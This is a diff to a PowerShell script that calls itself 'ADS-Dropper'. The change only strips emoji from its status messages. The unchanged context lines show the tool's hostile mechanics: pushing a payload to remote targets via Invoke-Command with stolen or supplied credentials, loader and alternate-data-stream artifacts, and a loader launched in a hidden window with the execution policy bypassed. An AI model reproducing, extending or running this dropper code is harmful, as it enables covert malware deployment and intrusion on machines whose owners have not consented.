@@ -492,10 +492,10 @@ return @{ Success = `$true; Artifacts = @{ ADS = `$adsPath; Loader = `$loaderPat
     
     try {
         $result = Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock $remoteBlock -ErrorAction Stop
-        Write-Host "✅ Remote deployment to $Target succeeded" -ForegroundColor Green
+        Write-Host "Remote deployment to $Target succeeded" -ForegroundColor Green
         return $result
     } catch {
-        Write-Error "❌ Remote deployment to $Target failed: $_"
+        Write-Error "Remote deployment to $Target failed: $_"
         return @{ Success = $false; Error = $_.Exception.Message }
     }
 }
@@ -520,7 +520,7 @@ foreach($target in $Targets) {
                 Start-Process powershell.exe -ArgumentList @('-WindowStyle', 'Hidden', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $loaderPath) -WindowStyle Hidden -NoNewWindow
             }
         }
-        Write-Host "✅ Local deployment complete" -ForegroundColor Green
+        Write-Host "Local deployment complete" -ForegroundColor Green
     } else {
         # REMOTE DEPLOYMENT
         Write-Host "→ Deploying to $target" -ForegroundColor Magenta
@@ -528,4 +528,4 @@ foreach($target in $Targets) {
     }
 }
 
-Write-Host "`n🎉 ADS-Dropper deployment complete!" -ForegroundColor Green
+Write-Host "ADS-Dropper deployment complete!" -ForegroundColor Green
